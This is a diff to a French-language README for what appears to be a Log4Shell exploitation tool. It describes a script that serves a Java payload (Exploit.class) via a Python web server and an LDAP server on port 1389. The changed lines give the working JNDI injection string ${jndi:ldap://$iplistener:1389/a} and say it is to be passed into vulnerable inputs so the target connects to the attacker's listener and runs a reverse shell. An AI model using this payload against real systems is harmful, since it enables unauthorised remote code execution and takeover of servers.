@@ -39,7 +39,9 @@ Le script :
 - Démarre un serveur web python hebergeant le payload Java (Exploit.class)
 - Démarre un serveur LDAP sur le port 1389 (pour renvoyer la connexion vers le serveur web python)
 
-L'exploit JNDI ${jndi:ldap://$iplistener:1389/a} (affiché par le script) forcera le serveur vulnérable à se connecter sur vos services pour exécuter le reverse shell final
+L'exploit JNDI ${jndi:ldap://$iplistener:1389/a} (affiché par le script) déclenchera la connexion du serveur vulnérable vers vos services pour exécuter le reverse shell final
+
+${jndi:ldap://$iplistener:1389/a} doit être passé dans les entrées vulnérables
 
 <br>
 
